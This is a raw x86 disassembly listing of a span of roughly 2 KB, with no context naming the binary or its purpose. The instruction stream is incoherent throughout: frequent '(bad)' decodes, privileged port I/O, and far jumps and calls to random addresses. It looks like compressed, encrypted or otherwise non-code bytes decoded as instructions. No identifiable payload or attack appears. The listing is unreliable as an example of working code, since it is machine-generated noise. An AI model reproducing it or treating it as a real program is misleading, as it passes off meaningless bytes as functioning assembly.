  408a37:	mov    bh,0x3b
  408a39:	loope  0x408a24
  408a3b:	ss pop ebx
  408a3d:	call   0xe825:0x910488f5
  408a44:	adc    al,BYTE PTR [edx-0x53]
  408a47:	pop    es
  408a48:	retf   
  408a49:	mov    ch,0xc6
  408a4b:	xor    DWORD PTR [eax+ebp*1],0x23
  408a4f:	pop    edx
  408a50:	inc    eax
  408a51:	push   edi
  408a52:	or     bl,BYTE PTR [ecx]
  408a54:	pop    edi
  408a55:	xchg   eax,esp
  408a57:	hlt    
  408a58:	clc    
  408a59:	mov    edx,DWORD PTR [esi+0x63]
  408a5c:	arpl   WORD PTR [esi+0x5cdc9bcd],di
  408a62:	pop    ecx
  408a63:	in     al,dx
  408a64:	cdq    
  408a65:	add    BYTE PTR [esi],0x60
  408a68:	mov    al,ds:0x9732192e
  408a6d:	jns    0x408ae0
  408a6f:	enter  0x1b88,0x57
  408a73:	in     al,0x1e
  408a75:	xchg   esi,eax
  408a76:	psllw  mm3,QWORD PTR [ebx]
  408a79:	and    edx,ecx
  408a7b:	xchg   BYTE PTR [esp+eax*1+0x18ae98f7],cl
  408a82:	xchg   cl,bl
  408a84:	inc    ebx
  408a85:	pop    edx
  408a86:	sbb    ah,BYTE PTR [ebx-0x8]
  408a89:	add    DWORD PTR [esi-0x22],edx
  408a8c:	or     dh,cl
  408a8e:	leave  
  408a8f:	ret    
  408a90:	out    dx,al
  408a91:	push   ebx
  408a92:	mov    al,ds:0xadc2ed88
  408a97:	aaa    
  408a98:	mov    eax,ds:0x7270216d
  408a9d:	and    dl,0x51
  408aa0:	add    eax,0x18c6bd07
  408aa5:	push   eax
  408aa6:	mov    edi,0xa3e4f517
  408aab:	ror    BYTE PTR [edx+0x65],1
  408aae:	add    eax,0x924741f4
  408ab3:	or     ch,BYTE PTR [edx]
  408ab5:	mov    ah,0x45
  408ab7:	mov    ebp,ds
  408ab9:	xchg   esi,eax
  408aba:	jmp    0x2a881cb3
  408abf:	pushfw 
  408ac1:	fwait
  408ac2:	push   edx
  408ac3:	xor    al,0xb5
  408ac5:	(bad)  
  408ac6:	aad    0xf0
  408ac8:	adc    cl,bl
  408aca:	repz jl 0x408aa9
  408acd:	int    0x97
  408acf:	retf   
  408ad0:	sahf   
  408ad1:	lock add al,0x4c
  408ad4:	(bad)  
  408ad5:	jno    0x408b01
  408ad7:	sub    eax,0xec31df52
  408adc:	daa    
  408add:	pop    esi
  408ade:	pusha  
  408adf:	ins    BYTE PTR es:[edi],dx
  408ae0:	add    al,0x48
  408ae2:	add    eax,0x9a8b8870
  408ae7:	in     al,0xaf
  408ae9:	push   ecx
  408aea:	jne    0x408b28
  408aec:	adc    eax,0xced034aa
  408af1:	sub    edx,ecx
  408af3:	push   0x3417a936
  408af8:	popa   
  408af9:	pop    ss
  408afa:	aas    
  408afb:	sub    BYTE PTR [eax],ch
  408afd:	push   0x64
  408aff:	fs pop ss
  408b01:	add    dl,al
  408b03:	ss out 0xee,al
  408b06:	dec    ebp
  408b07:	push   ss
  408b08:	jle    0x408b61
  408b0a:	sbb    eax,0x5dbe68fd
  408b0f:	push   ebp
  408b10:	xor    DWORD PTR [ebx],eax
  408b12:	shl    DWORD PTR [eax-0x441673a1],1
  408b18:	ret    0xc332
  408b1b:	dec    ebx
  408b1c:	sub    bp,WORD PTR [edx+0x67e0aad2]
  408b23:	nop
  408b24:	das    
  408b25:	fist   DWORD PTR [esi]
  408b27:	mov    ecx,0xd3b33b57
  408b2c:	pop    esi
  408b2d:	out    dx,al
  408b2e:	mov    ebx,0xae55abfd
  408b33:	sbb    bl,BYTE PTR ss:[edx+0x3c]
  408b37:	push   edx
  408b38:	shr    edx,1
  408b3a:	add    BYTE PTR [eax+0x5bab5b29],0xae
  408b41:	jl     0x408b86
  408b43:	aas    
  408b44:	jns    0x408b56
  408b46:	mov    DWORD PTR [eax+0x51e98888],ebp
  408b4c:	xor    DWORD PTR [edx-0x46],edx
  408b4f:	or     BYTE PTR [eax-0x2ca6c4b1],ah
  408b55:	sar    dl,1
  408b57:	pop    esi
  408b58:	dec    esp
  408b59:	pushf  
  408b5a:	xchg   DWORD PTR [eax+0x7ee79dc8],edx
  408b60:	pusha  
  408b61:	push   0xffffff98
  408b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b64:	lods   al,BYTE PTR ds:[esi]
  408b65:	loopne 0x408b21
  408b67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b68:	push   ds
  408b69:	dec    esp
  408b6a:	sbb    bl,al
  408b6c:	aam    0x7e
  408b6e:	pop    esi
  408b6f:	jg     0x408ba8
  408b71:	xor    bh,al
  408b73:	and    BYTE PTR [edx-0x5a38b427],0x24
  408b7a:	add    ecx,DWORD PTR [eax]
  408b7c:	mov    ch,0xbe
  408b7e:	mov    ds:0x5b7f83bf,eax
  408b83:	mov    ebx,0x2029115c
  408b88:	hlt    
  408b89:	paddb  mm5,QWORD PTR [ebx+esi*1]
  408b8d:	repz in eax,0x9c
  408b90:	fdiv   DWORD PTR [edx+0x380509d9]
  408b96:	push   0xffffffb5
  408b98:	xor    bh,cl
  408b9a:	shr    DWORD PTR [eax+edi*8],1
  408b9d:	out    dx,eax
  408b9e:	in     al,0xaa
  408ba0:	and    bl,al
  408ba2:	int3   
  408ba3:	or     eax,0xb07e5023
  408ba8:	daa    
  408ba9:	outs   dx,DWORD PTR ds:[esi]
  408baa:	mov    edx,0xb729234b
  408baf:	aas    
  408bb0:	mov    BYTE PTR [edi],cl
  408bb2:	sbb    eax,0xceab5fe5
  408bb7:	mov    edi,0xc9ce8e1e
  408bbc:	enter  0xffcf,0x14
  408bc0:	or     eax,0x79f97ef0
  408bc5:	iret   
  408bc6:	repnz push cs
  408bc8:	js     0x408c41
  408bca:	outs   dx,BYTE PTR ds:[esi]
  408bcb:	ds test al,0x4e
  408bce:	inc    esi
  408bcf:	jmp    0x66669d62
  408bd4:	jp     0x408baf
  408bd6:	lds    esi,FWORD PTR [edi-0x38]
  408bd9:	sbb    al,0xf4
  408bdb:	dec    edx
  408bdc:	div    BYTE PTR fs:[esi+0x53]
  408be0:	adc    DWORD PTR ds:0x1abe561a,ecx
  408be6:	or     eax,0x599f40a7
  408beb:	jno    0x408c28
  408bed:	loope  0x408bd4
  408bef:	cli    
  408bf0:	inc    esi
  408bf1:	add    DWORD PTR [eax+eax*2+0x40],ebx
  408bf5:	sub    BYTE PTR [ebx+0x24],0x4
  408bf9:	jmp    0x408ba2
  408bfb:	iret   
  408bfc:	push   ebp
  408bfd:	sbb    dh,ah
  408bff:	stos   BYTE PTR es:[edi],al
  408c00:	xchg   ebp,eax
  408c01:	(bad)  
  408c02:	sbb    BYTE PTR [ecx-0x16bfc376],dl
  408c08:	xor    al,0x48
  408c0a:	outs   dx,BYTE PTR ds:[esi]
  408c0b:	out    dx,al
  408c0c:	sub    eax,0xed2024bf
  408c11:	cmc    
  408c12:	ja     0x408c18
  408c14:	test   DWORD PTR [ecx+0x5a],0xcc0c26ce
  408c1b:	sub    DWORD PTR [eax-0x2e],0x9eb415b2
  408c22:	mov    ebx,0xeeccd31
  408c27:	data16 data16 mov bl,0xe3
  408c2b:	repnz arpl WORD PTR [esi+0xba1309e],ax
  408c32:	xchg   ebx,eax
  408c33:	shl    DWORD PTR [eax],1
  408c35:	add    esi,ebp
  408c37:	ret    
  408c38:	jmp    0x5991b735
  408c3d:	repz pop ds
  408c3f:	fcomp  st(5)
  408c41:	mov    ds:0xafaf7746,eax
  408c46:	ins    DWORD PTR es:[edi],dx
  408c47:	add    BYTE PTR [ebx],dh
  408c49:	nop
  408c4a:	aaa    
  408c4b:	cmp    dl,BYTE PTR [ebx+0x3d69d4df]
  408c51:	xor    BYTE PTR [edx-0x3c8fc08a],al
  408c57:	push   edx
  408c58:	pop    ebx
  408c59:	mov    bl,0x22
  408c5b:	push   0x555e83ba
  408c60:	pop    esi
  408c61:	sub    BYTE PTR [edi+0x24f00b3b],ah
  408c67:	inc    ebp
  408c68:	dec    ebp
  408c69:	call   FWORD PTR [edx+0x36]
  408c6c:	rcl    dl,cl
  408c6e:	sub    ebp,DWORD PTR [ebp-0x42]
  408c71:	xchg   dl,dh
  408c73:	mov    cl,0xe2
  408c75:	outs   dx,BYTE PTR ds:[esi]
  408c76:	mov    cl,BYTE PTR [ebx]
  408c78:	rcl    esp,0x35
  408c7b:	jmp    0x408bfd
  408c7d:	scas   eax,DWORD PTR es:[edi]
  408c7e:	aaa    
  408c7f:	jl     0x408c17
  408c81:	and    DWORD PTR [esi+ebp*2+0x31ae7e2c],edi
  408c88:	inc    edi
  408c89:	add    cl,BYTE PTR [eax+eax*2+0x6407f478]
  408c90:	std    
  408c91:	pop    edi
  408c92:	inc    esi
  408c93:	fsub   st(3),st
  408c95:	(bad)  
  408c96:	in     al,dx
  408c97:	test   BYTE PTR [ebp-0x6ad21a98],0x0
  408c9e:	in     al,dx
  408c9f:	add    esi,DWORD PTR [edi-0xd18b79e]
  408ca5:	xor    DWORD PTR [edx-0x60],edx
  408ca8:	fdivr  QWORD PTR [ecx-0x28e5a550]
  408cae:	pop    edx
  408caf:	mov    es,WORD PTR [eax-0x62]
  408cb2:	inc    esp
  408cb3:	mov    ebp,0x21acaa4a
  408cb8:	retf   
  408cb9:	test   DWORD PTR [ebx],ebx
  408cbb:	push   ebp
  408cbc:	clc    
  408cbd:	pop    eax
  408cbe:	cmc    
  408cbf:	lds    ebx,FWORD PTR [ebp+0x2d]
  408cc2:	(bad)  
  408cc3:	push   0x34
  408cc5:	jg     0x408ccd
  408cc7:	inc    edx
  408cc8:	outs   dx,DWORD PTR ds:[esi]
  408cc9:	mov    edx,0xb5bb079a
  408cce:	push   ebp
  408ccf:	jmp    0xba8e4b69
  408cd4:	(bad)  
  408cd5:	mov    dh,0xd4
  408cd7:	cmp    BYTE PTR [eax-0x350b4cdf],dh
  408cdd:	push   es
  408cde:	mov    esp,0xe6bb9cac
  408ce3:	sti    
  408ce4:	pop    esp
  408ce5:	into   
  408ce6:	std    
  408ce7:	rcl    BYTE PTR [esi-0x5],cl
  408cea:	mov    ?,WORD PTR [edi]
  408cec:	mov    ds:0xfc2eb170,al
  408cf1:	pusha  
  408cf2:	jns    0x408c95
  408cf4:	fdiv   st,st(2)
  408cf6:	repnz push ebx
  408cf8:	sbb    al,0xe0
  408cfa:	shl    BYTE PTR [esi+0x25],0x8c
  408cfe:	fmul   QWORD PTR [ebp+0x20687539]
  408d04:	add    al,0x3
  408d07:	push   esi
  408d08:	mov    ch,0xda
  408d0a:	xchg   ecx,eax
  408d0b:	cmp    BYTE PTR [edi+0x5f9490cc],bl
  408d11:	sbb    al,0x8e
  408d13:	(bad)  
  408d14:	mov    dl,0xc7
  408d16:	jecxz  0x408d55
  408d18:	xchg   ebx,eax
  408d19:	pop    edi
  408d1a:	inc    esp
  408d1b:	jl     0x408d15
  408d1d:	cmp    al,0xe3
  408d1f:	sub    cl,BYTE PTR [esi+0x5a]
  408d22:	in     al,dx
  408d23:	into   
  408d24:	fwait
  408d25:	hlt    
  408d26:	scas   eax,DWORD PTR es:[edi]
  408d27:	ror    cl,0xd0
  408d2a:	xchg   ebp,eax
  408d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d2c:	jne    0x408d6f
  408d2e:	shr    DWORD PTR [eax+0x26ff948d],cl
  408d34:	add    esp,ebp
  408d36:	dec    ebx
  408d37:	xor    al,0xe4
  408d39:	lds    esi,FWORD PTR [eax+eax*2-0x3e8ef528]
  408d40:	pop    esi
  408d41:	jbe    0x408d07
  408d43:	dec    edi
  408d44:	sbb    DWORD PTR [ebx+eiz*4-0x7ab5bca3],ecx
  408d4b:	inc    edx
  408d4c:	pop    ss
  408d4d:	aam    0x3b
  408d4f:	adc    ch,BYTE PTR [edi-0x7a65344d]
  408d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d56:	push   es
  408d57:	mov    cl,0x63
  408d59:	(bad)  
  408d5a:	sbb    eax,0x7703e29f
  408d5f:	mov    ds:0xdc795f0,eax
  408d64:	cmp    eax,0xe60b3fde
  408d69:	sti    
  408d6a:	shl    BYTE PTR [esi],1
  408d6c:	mov    al,ds:0xf9f56c25
  408d71:	mov    ebx,0x1a89b50a
  408d76:	das    
  408d77:	test   DWORD PTR [eax+eiz*4+0x552319c7],edx
  408d7e:	outs   dx,DWORD PTR ds:[esi]
  408d7f:	pop    ss
  408d80:	icebp  
  408d81:	(bad)  [ecx-0x57c4282c]
  408d87:	jecxz  0x408dc3
  408d89:	sub    al,0x4f
  408d8b:	push   es
  408d8c:	mov    edx,0x4f87e813
  408d91:	shr    DWORD PTR [ebp+0x52],0x38
  408d95:	add    bh,BYTE PTR [eax+ebp*1+0x2922c448]
  408d9c:	add    bl,cl
  408d9e:	xchg   ebp,eax
  408d9f:	js     0x408d2c
  408da1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408da3:	mov    DWORD PTR [ecx+0x41],ebp
  408da6:	xor    dh,BYTE PTR [ebp+0x6e]
  408da9:	add    dh,BYTE PTR [esi]
  408dab:	das    
  408dac:	retf   
  408dad:	jge    0x408dda
  408daf:	add    bh,BYTE PTR [ebx-0x51063ccf]
  408db5:	lods   al,BYTE PTR ds:[esi]
  408db6:	popa   
  408db7:	dec    eax
  408db8:	push   ebp
  408db9:	cmp    esi,DWORD PTR ds:[ebx+esi*2+0x25]
  408dbe:	out    dx,eax
  408dbf:	es addr16 in al,dx
  408dc2:	out    0x8e,eax
  408dc4:	std    
  408dc5:	adc    dl,BYTE PTR [ebx+edi*1+0x38]
  408dc9:	add    al,0x11
  408dcb:	iret   
  408dcc:	(bad)  
  408dcd:	pop    ds
  408dce:	sbb    BYTE PTR fs:[esi],dl
  408dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dd2:	arpl   WORD PTR [ecx+0x65],cx
  408dd5:	jg     0x408d90
  408dd7:	fwait
  408dd8:	mov    dh,0x8e
  408dda:	inc    esp
  408ddb:	dec    ebp
  408ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ddd:	push   edi
  408dde:	add    DWORD PTR [edx],ecx
  408de0:	or     bh,BYTE PTR [ecx+0xe310bab]
  408de6:	adc    ebp,DWORD PTR [ecx]
  408de8:	idiv   DWORD PTR [ecx]
  408dea:	addr16 xchg edx,eax
  408dec:	lahf   
  408ded:	add    DWORD PTR cs:[ecx-0x6dbbfa08],ebp
  408df4:	popa   
  408df5:	pop    esi
  408df6:	std    
  408df7:	add    BYTE PTR [edi+0x13],ch
  408dfa:	out    0x2e,al
  408dfc:	lea    esp,[esi+edi*2-0x17dffdbd]
  408e03:	push   0x47b49cff
  408e08:	xchg   edx,eax
  408e09:	dec    edi
  408e0a:	outs   dx,DWORD PTR ds:[esi]
  408e0b:	pop    ss
  408e0c:	test   DWORD PTR [ebp+0x7d],eax
  408e0f:	imul   esi,DWORD PTR [ebx],0x3a
  408e12:	sbb    BYTE PTR [ebp-0x305cc515],dh
  408e18:	daa    
  408e19:	mov    eax,ds:0x4210c6f3
  408e1e:	mov    ebx,cs
  408e20:	cmc    
  408e21:	ret    
  408e22:	sar    DWORD PTR [ecx],1
  408e24:	std    
  408e25:	jge    0x408e2e
  408e27:	scas   al,BYTE PTR es:[edi]
  408e28:	imul   esi,DWORD PTR [ecx],0xffffff82
  408e2b:	add    al,0xec
  408e2d:	je     0x408e74
  408e2f:	jne    0x408e5e
  408e31:	adc    eax,0x3933bed4
  408e36:	rcl    BYTE PTR [edi+0x3e],1
  408e39:	dec    esi
  408e3a:	adc    ebx,DWORD PTR [ecx-0x62]
  408e3d:	shl    ebx,0xb3
  408e40:	fwait
  408e41:	xor    al,0x26
  408e43:	push   ebp
  408e44:	mov    eax,ds:0x178fb80e
  408e49:	mov    DWORD PTR [eax+ebx*2+0x59f8bb89],edi
  408e50:	sbb    ebp,DWORD PTR [ecx]
  408e52:	stos   DWORD PTR es:[edi],eax
  408e53:	mov    eax,ds:0xda5e595e
  408e58:	pop    ebx
  408e59:	dec    ebx
  408e5a:	leave  
  408e5b:	(bad)  
  408e5c:	fdivr  DWORD PTR [edx]
  408e5e:	cwde   
  408e5f:	push   edi
  408e60:	test   DWORD PTR [eax],edi
  408e62:	push   esi
  408e63:	scas   al,BYTE PTR es:[edi]
  408e64:	shr    DWORD PTR [ecx+0x2257c5e3],0xf
  408e6b:	dec    esp
  408e6c:	in     al,0xae
  408e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e6f:	mov    fs,WORD PTR [ebp-0x3fac074e]
  408e75:	inc    ebp
  408e76:	sub    cl,BYTE PTR [edx+ecx*4]
  408e79:	pop    esi
  408e7a:	(bad)  
  408e7b:	leave  
  408e7c:	push   ss
  408e7d:	mov    fs,WORD PTR [eax+0xb3f2d2e]
  408e83:	test   edi,0xd0a9027d
  408e89:	sub    BYTE PTR [ecx+0x16],cl
  408e8c:	imul   eax,DWORD PTR [eax],0x5319ae6
  408e92:	push   ds
  408e93:	or     eax,0x92334794
  408e98:	jae    0x408ef3
  408e9a:	je     0x408e79
  408e9c:	push   esp
  408e9d:	rcr    ch,1
  408e9f:	adc    eax,0x383f541d
  408ea4:	(bad)  
  408ea5:	pop    esp
  408ea6:	imul   esi,edi,0xcb46a46b
  408eac:	fld    st(1)
  408eae:	jmp    0x408e46
  408eb0:	fwait
  408eb1:	pop    esi
  408eb2:	inc    ecx
  408eb3:	jbe    0x408ec5
  408eb5:	cmp    BYTE PTR [edi-0x53bdf26b],bl
  408ebb:	mov    cl,0x47
  408ebd:	xor    al,0x7c
  408ebf:	adc    eax,0x6a6f4eba
  408ec4:	add    eax,0x91434df8
  408ec9:	je     0x408ef0
  408ecb:	or     DWORD PTR [ebp+0x44],ecx
  408ece:	pop    ebx
  408ecf:	push   ss
  408ed0:	xchg   BYTE PTR [edi],bl
  408ed2:	mov    ecx,0xf37a3dea
  408ed7:	sub    ecx,ecx
  408ed9:	jecxz  0x408e74
  408edb:	loope  0x408f1c
  408edd:	xor    eax,esp
  408edf:	je     0x408ee3
  408ee1:	shr    BYTE PTR [edx],cl
  408ee3:	sub    al,0xd3
  408ee5:	add    eax,0xccd91f98
  408eea:	add    edx,DWORD PTR [edx+0xe]
  408eed:	mov    esp,0x69d4e2df
  408ef2:	cmp    eax,0x38f6e49d
  408ef7:	lahf   
  408ef8:	pushf  
  408ef9:	sub    al,0x95
  408efb:	cmp    ebx,DWORD PTR [ecx]
  408efd:	or     edx,ecx
  408eff:	or     eax,0x263cc060
  408f04:	jge    0x408f1f
  408f06:	jmp    0x408f41
  408f08:	jecxz  0x408eec
  408f0a:	stos   BYTE PTR es:[edi],al
  408f0b:	add    DWORD PTR cs:[ecx+0x6b7d8850],esp
  408f12:	jmp    0x806f0606
  408f17:	jmp    0x8fd3:0xdefc3872
  408f1e:	push   edx
  408f1f:	jg     0x408f2c
  408f21:	push   ds
  408f22:	pmaxub mm7,QWORD PTR [edi-0x67]
  408f26:	call   DWORD PTR [edx+0x2a]
  408f29:	cmp    edx,DWORD PTR [ecx-0x52]
  408f2c:	pop    ss
  408f2d:	xchg   esi,eax
  408f2e:	enter  0x2fb0,0x9b
  408f32:	jmp    0x408f6c
  408f34:	mov    ds:0xa99305e6,eax
  408f39:	jmp    0xe3db:0xfc86966d
  408f40:	or     eax,0x33296267
  408f45:	repnz sar DWORD PTR [edx],1
  408f48:	shl    BYTE PTR [edi+0x52],1
  408f4b:	xchg   DWORD PTR [edi+0x7aba326b],eax
  408f51:	push   ss
  408f52:	adc    eax,0xde3e24eb
  408f57:	test   eax,0x9dffcdfb
  408f5c:	adc    BYTE PTR [esi-0x41],dl
  408f5f:	cmp    BYTE PTR [ecx+ebx*2+0x36],0x6d
  408f64:	xchg   esi,eax
  408f65:	or     dl,BYTE PTR [edi+edx*1]
  408f68:	and    BYTE PTR [ebx+0x429852f],bh
  408f6e:	cmp    eax,0x7e82ea28
  408f73:	xchg   bh,bl
  408f75:	repnz popf 
  408f77:	push   esi
  408f78:	mov    edx,0x2060ca69
  408f7d:	inc    edi
  408f7e:	or     DWORD PTR [ebx],ecx
  408f80:	jno    0x408f64
  408f82:	in     eax,0x8c
  408f84:	sbb    bl,bh
  408f86:	xor    ebx,ebx
  408f88:	ja     0x408f4c
  408f8a:	pop    esp
  408f8b:	outs   dx,DWORD PTR ds:[esi]
  408f8c:	jae    0x408f85
  408f8e:	or     ecx,esp
  408f90:	mov    eax,0xa1e15d94
  408f95:	mov    cs,ecx
  408f97:	inc    edx
  408f98:	inc    edx
  408f99:	push   edi
  408f9a:	or     al,0x4a
  408f9c:	std    
  408f9d:	pop    ds
  408f9e:	rcl    BYTE PTR [ebp+0x560f0a89],1
  408fa4:	adc    cl,BYTE PTR [ebp+eax*1+0x4977c182]
  408fab:	sub    eax,0x69fca29a
  408fb0:	mov    ah,0xcb
  408fb2:	test   eax,0xf5a5f31c
  408fb7:	mov    cl,0xc4
  408fb9:	dec    edi
  408fba:	fmul   DWORD PTR [eax+ebx*4]
  408fbd:	cs scas eax,DWORD PTR es:[edi]
  408fbf:	add    bh,dh
  408fc1:	daa    
  408fc2:	push   edi
  408fc3:	rcl    esi,cl
  408fc5:	jge    0x408f4c
  408fc7:	fxch   st(4)
  408fc9:	push   ecx
  408fca:	jmp    0x408f54
  408fcc:	xchg   ebp,eax
  408fcd:	pop    edx
  408fce:	call   0x34093c9b
  408fd3:	jle    0x408f61
  408fd5:	fdivr  st,st(5)
  408fd8:	jle    0x408f62
  408fda:	dec    edi
  408fdb:	cli    
  408fdc:	pop    eax
  408fdd:	adc    esp,DWORD PTR [ecx-0x75]
  408fe0:	sbb    DWORD PTR [eax-0x57cc3579],esp
  408fe6:	(bad)  
  408fe7:	outs   dx,BYTE PTR ds:[esi]
  408fe8:	inc    ecx
  408fe9:	pop    ecx
  408fea:	sub    BYTE PTR [edi+0x39417bb7],ch
  408ff0:	iret   
  408ff1:	mov    ecx,0x570b4303
  408ff6:	push   0x82e36d4e
  408ffb:	clc    
  408ffc:	xor    DWORD PTR [edi+0x3aec7362],ebp
  409002:	(bad)
  409005:	push   es
  409006:	inc    ebx
  409007:	jl     0x408ff7
  409009:	or     ebx,ecx
  40900b:	mov    al,0x23
  40900d:	ret    0x92e5
  409010:	fcomp  DWORD PTR [edx]
  409012:	mov    esi,0x53c9f5bf
  409017:	mov    cl,0x37
  409019:	nop
  40901a:	add    esp,edi
  40901c:	sahf   
  40901d:	jecxz  0x40901d
  40901f:	xor    bl,BYTE PTR [edx]
  409021:	xchg   esp,eax
  409022:	xchg   DWORD PTR [esi+0x4c0f2c2d],eax
  409028:	jbe    0x409022
  40902a:	jno    0x40900b
  40902c:	push   ebx
  40902d:	cwde   
  40902e:	pop    ds
  40902f:	push   ecx
  409030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409031:	or     ecx,DWORD PTR [edi]
  409033:	sbb    al,0xe5
  409035:	inc    ecx
  409036:	xchg   esi,eax
  409037:	and    edx,edi
  409039:	fistp  DWORD PTR [ebp+0x60]
  40903c:	imul   ebp,DWORD PTR [edi-0x789860a4],0xffffffa7
  409043:	(bad)  
  409044:	sub    DWORD PTR [ecx-0x5e4a2e65],esp
  40904a:	cmp    ebp,esp
  40904c:	idiv   DWORD PTR [ecx]
  40904e:	push   ebx
  40904f:	repnz fisub WORD PTR [edi+0x36]
  409053:	std    
  409054:	xor    DWORD PTR [ebp+0x9],esp
  409057:	pop    esi
  409058:	pop    ecx
  409059:	inc    ecx
  40905a:	jle    0x409098
  40905c:	loop   0x409008
  40905e:	ficom  WORD PTR ds:0x20f4b159
  409064:	fucom  st(7)
  409066:	pop    es
  409067:	dec    esp
  409068:	jge    0x40900a
  40906a:	enter  0x3de2,0xc0
  40906e:	ins    DWORD PTR es:[edi],dx
  40906f:	xchg   esp,eax
  409070:	leavew 
  409072:	adc    dh,0x8f
  409075:	xor    DWORD PTR [edi-0x59],0xffffffd4
  409079:	mov    ecx,cs
  40907b:	inc    edi
  40907c:	sahf   
  40907d:	ror    BYTE PTR [edx-0x16],0x42
  409081:	sahf   
  409082:	mov    ebp,0x6ad5ad2c
  409087:	or     al,BYTE PTR [esi+0x6d19f5c8]
  40908d:	cmp    al,0xf5
  40908f:	dec    ebx
  409090:	push   ebx
  409091:	fwait
  409092:	xor    esp,DWORD PTR [ecx]
  409094:	inc    ebx
  409095:	stos   BYTE PTR es:[edi],al
  409096:	mov    edx,0xa25b624f
  40909b:	fadd   st,st(7)
  40909d:	sbb    eax,0xcfc577d9
  4090a2:	mov    WORD PTR [ebx],?
  4090a4:	test   bl,bl
  4090a6:	mov    ah,0x16
  4090a8:	jmp    0x409114
  4090aa:	or     bh,dh
  4090ac:	jmp    0x409037
  4090ae:	mov    cs,WORD PTR [eax+0x15aaca7a]
  4090b4:	fisubr DWORD PTR [edx-0xc]
  4090b7:	ret    
  4090b8:	into   
  4090b9:	cmp    al,0xb6
  4090bb:	xor    eax,0xc79e4b7
  4090c0:	sub    al,0xf0
  4090c2:	xor    bh,BYTE PTR [ebp+0x32cfaf4e]
  4090c8:	sub    eax,DWORD PTR [edx]
  4090ca:	or     DWORD PTR [esi],ecx
  4090cc:	lods   al,BYTE PTR ds:[esi]
  4090cd:	xchg   esp,eax
  4090ce:	stos   BYTE PTR es:[edi],al
  4090cf:	cmp    BYTE PTR ds:0xcb1949f9,bl
  4090d5:	jl     0x4090ee
  4090d7:	(bad)  
  4090d8:	pop    ss
  4090d9:	pop    esp
  4090da:	rcr    DWORD PTR [esi],0x30
  4090dd:	jbe    0x409117
  4090df:	pop    ds
  4090e0:	repz rol ebp,cl
  4090e3:	leave  
  4090e4:	scas   al,BYTE PTR es:[edi]
  4090e5:	call   0xf0fa:0x6fe1f257
  4090ec:	xchg   DWORD PTR [eax-0x4b],ebp
  4090ef:	call   0x5c4c74b0
  4090f4:	out    dx,eax
  4090f5:	and    dl,bl
  4090f7:	mov    dl,cl
  4090f9:	pop    edi
  4090fa:	mov    edi,0xa9056ff3
  4090ff:	cli    
  409100:	adc    esp,DWORD PTR [ebx+0x30f7b68e]
  409106:	jg     0x409177
  409108:	pusha  
  409109:	cli    
  40910a:	jb     0x409099
  40910c:	out    dx,eax
  40910d:	loop   0x4090fd
  40910f:	ins    BYTE PTR es:[edi],dx
  409110:	and    cl,ch
  409112:	cmp    edi,DWORD PTR [esi]
  409114:	aam    0xa9
  409116:	test   BYTE PTR [ebx],bh
  409118:	callw  0x6bff
  40911c:	xchg   edx,eax
  40911d:	ins    BYTE PTR es:[edi],dx
  40911e:	inc    esi
  40911f:	fwait
  409120:	cmp    al,0x30
  409122:	push   esi
  409123:	jae    0x4090f8
  409125:	jp     0x4090b2
  409127:	jecxz  0x409147
  409129:	das    
  40912a:	mov    edi,0xb421ac37
  40912f:	push   ebx
  409130:	jp     0x4090d9
  409132:	inc    esp
  409133:	jle    0x4090ee
  409135:	mov    edx,0xce8e368e
  40913a:	xchg   edx,eax
  40913b:	test   eax,0x26bdd94f
  409140:	rcr    BYTE PTR [esi-0x4284786c],0x5f
  409147:	mov    al,ah
  409149:	xchg   ebp,eax
  40914a:	push   eax
  40914b:	xor    eax,0x7e0ed6f4
  409150:	clc    
  409151:	cmc    
  409152:	addr16 (bad) 
  409154:	repz ret 
  409156:	sbb    eax,0x1dc1b92e
  40915b:	arpl   WORD PTR [eax+ebp*8],dx
  40915e:	jnp    0x409182
  409160:	xor    BYTE PTR [ebp+0x33],ch
  409163:	popf   
  409164:	adc    eax,0x2a771e07
  409169:	sub    ah,bl
  40916b:	mov    ds:0x70c2c20b,eax
  409170:	mov    edx,0x92e3fd72
  409175:	push   edi
  409176:	iret   
  409177:	aad    0xaf
  409179:	xchg   DWORD PTR [esi+0x67],edi
  40917c:	add    al,0xa7
  40917e:	lahf   
  40917f:	cli    
  409180:	loopne 0x409153
  409182:	mov    al,ch
  409184:	nop
  409185:	stos   BYTE PTR es:[edi],al
  409186:	xchg   edi,eax
  409187:	(bad)  
  409189:	retf   
  40918a:	adc    BYTE PTR [ebx],bl
  40918c:	jmp    0x5c37:0x3919f7e8
  409193:	ds mov fs,ebp
  409196:	xchg   BYTE PTR [esi-0x1b8c1b7d],ah
  40919c:	leave  
  40919d:	push   esp
  40919e:	jecxz  0x4091a8
  4091a0:	add    dl,BYTE PTR [ebx-0x9]
  4091a3:	ficomp WORD PTR ds:0xc1495587
  4091a9:	or     BYTE PTR [edx],bh
  4091ab:	pop    edi
  4091ac:	dec    ecx
  4091ad:	rcl    BYTE PTR [esi-0x6c72302a],cl
  4091b3:	mov    DWORD PTR [edi],ecx
  4091b5:	mov    DWORD PTR [ebp+ebx*4-0x7505a6aa],0x818fa2f9
  4091c0:	fwait
  4091c1:	lahf   
  4091c2:	maskmovq mm4,mm5
  4091c5:	hlt    
  4091c6:	cwde   
  4091c7:	add    eax,0x6601c4c9
  4091cc:	clc    
  4091cd:	int    0xc9
  4091cf:	add    bh,BYTE PTR [ebx-0x39]
  4091d2:	xchg   esp,eax
  4091d3:	imul   ebp,DWORD PTR [edx+0x6f24bf83],0x4f
  4091da:	cmp    DWORD PTR [ebx-0x22],ebx
  4091dd:	mov    al,ah
  4091df:	pop    ss
  4091e0:	outs   dx,DWORD PTR ds:[esi]
  4091e1:	jmp    0xade0:0xabe148b9
  4091e8:	jo     0x4091c5
  4091ea:	pushf  
  4091eb:	jno    0x40923a
  4091ed:	(bad)  
  4091ee:	loopne 0x40921f
  4091f0:	jecxz  0x4091f0
  4091f2:	js     0x4091b0
  4091f4:	sbb    al,0x2a
  4091f6:	inc    esi
  4091f7:	mov    ebp,?
